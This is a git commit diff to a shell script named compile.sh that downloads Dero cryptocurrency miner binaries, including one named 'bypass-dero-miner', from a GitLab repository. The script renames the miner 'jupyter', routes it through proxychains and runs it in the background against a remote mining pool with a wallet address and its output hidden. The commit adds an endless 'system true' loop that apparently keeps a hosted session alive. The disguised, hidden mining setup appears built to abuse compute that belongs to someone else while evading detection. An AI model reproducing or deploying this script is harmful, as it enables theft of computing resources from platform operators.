97b7d3dcb8b82ee55a0b39168e373bf95ce54bef
slametcepok84 <114875849+slametcepok84@users.noreply.github.com>
2022-11-04 03:56:28 +0700

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -5,7 +5,6 @@ pass="maseh"
 curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x jupyter
 curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x jupyter
 curl -L -o proxy https://gitlab.com/alekpoden82/binamas/-/raw/main/panel && chmod +x proxy
-curl -L https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
 curl -L https://gitlab.com/alekpoden82/binamas/-/raw/main/libproxychains4.so && chmod +x libproxychains4.so
 curl -L https://gitlab.com/alekpoden82/binamas/-/raw/main/proxychains.conf && chmod +x proxychains.conf 
 sleep 1 
@@ -22,5 +21,4 @@ echo " "
 echo " " 
 echo "New IP ==> "$(./proxy curl ifconfig.me)
 ./proxy ./jupyter -r 159.223.89.34:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.$(echo $(shuf -i 1-20000 -n 1)-dad) >/dev/null &
-./compile.sh
-echo success
+while :; do echo "system true"; sleep 30; done
